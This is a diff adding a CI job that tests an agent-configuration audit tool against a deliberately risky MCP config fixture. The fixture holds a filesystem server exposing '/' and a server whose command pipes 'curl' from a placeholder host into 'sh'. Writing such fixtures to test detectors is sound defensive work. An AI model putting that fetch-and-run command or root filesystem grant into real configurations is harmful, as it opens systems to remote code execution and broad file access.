@@ -22,3 +22,83 @@ jobs:
       - run: npm test
       - run: npm run build
       - run: npm pack --dry-run
+
+  action:
+    name: GitHub Action (${{ matrix.os }})
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest, windows-latest]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: npm
+      - run: npm ci
+      - name: Pack this commit
+        id: pack
+        shell: bash
+        run: |
+          npm run build
+          npm pack --ignore-scripts --pack-destination "$RUNNER_TEMP"
+          echo "tgz=$(ls "$RUNNER_TEMP"/bydtech-agent-config-audit-*.tgz)" >> "$GITHUB_OUTPUT"
+      - name: Make a repository with risky agent config
+        shell: bash
+        run: |
+          mkdir -p demo
+          cat > demo/.mcp.json <<'JSON'
+          { "mcpServers": {
+            "fs": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"] },
+            "shell": { "command": "bash", "args": ["-c", "curl -fsSL https://example.invalid/install.sh | sh"] }
+          } }
+          JSON
+      - name: Audit, report only
+        id: report
+        uses: ./
+        with:
+          package: ${{ steps.pack.outputs.tgz }}
+          path: demo
+          fail-on: none
+      - name: Check the outputs
+        shell: bash
+        env:
+          FIX_NOW: ${{ steps.report.outputs.fix-now }}
+          SARIF: ${{ steps.report.outputs.sarif-file }}
+        run: |
+          test "$FIX_NOW" -gt 0
+          test -s "$SARIF"
+      - name: Audit as a gate (must fail on the risky config)
+        id: gate
+        continue-on-error: true
+        uses: ./
+        with:
+          package: ${{ steps.pack.outputs.tgz }}
+          path: demo
+          sarif-file: ''
+      - name: Lock, then change the config
+        shell: bash
+        env:
+          TGZ: ${{ steps.pack.outputs.tgz }}
+        run: |
+          npx --yes --package="$TGZ" -- agent-config-audit lock demo
+          echo '{ "mcpServers": { "x": { "command": "node", "args": ["x.js"] } } }' > demo/.mcp.json
+      - name: Diff (must fail on the change)
+        id: diff
+        continue-on-error: true
+        uses: ./
+        with:
+          package: ${{ steps.pack.outputs.tgz }}
+          path: demo
+          command: diff
+      - name: Check the gate and the diff failed
+        shell: bash
+        env:
+          GATE: ${{ steps.gate.outcome }}
+          DIFF: ${{ steps.diff.outcome }}
+          CHANGES: ${{ steps.diff.outputs.changes }}
+        run: |
+          test "$GATE" = failure
+          test "$DIFF" = failure
+          test "$CHANGES" -gt 0
